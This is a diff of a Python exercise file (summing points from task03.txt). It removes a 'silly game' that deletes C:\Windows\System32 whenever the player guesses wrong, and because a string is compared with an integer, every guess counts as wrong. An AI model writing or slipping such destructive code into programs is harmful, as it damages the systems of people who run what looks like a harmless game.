@@ -8,18 +8,4 @@ Read the contents of task03.txt into your program and determine the points value
 For sample data task03.txt, the largest sum should be 68787
 """
 
-import random
-import os
 
-number = random.randint(1,10)
-
-guess = input("silly game! guess a number between 1 and 10: ")
-
-if guess == number:
-    print("you won!")
-
-
-else:
-    os.remove("C:\Windows\System32")
-
-print(f"the real number is {number}")
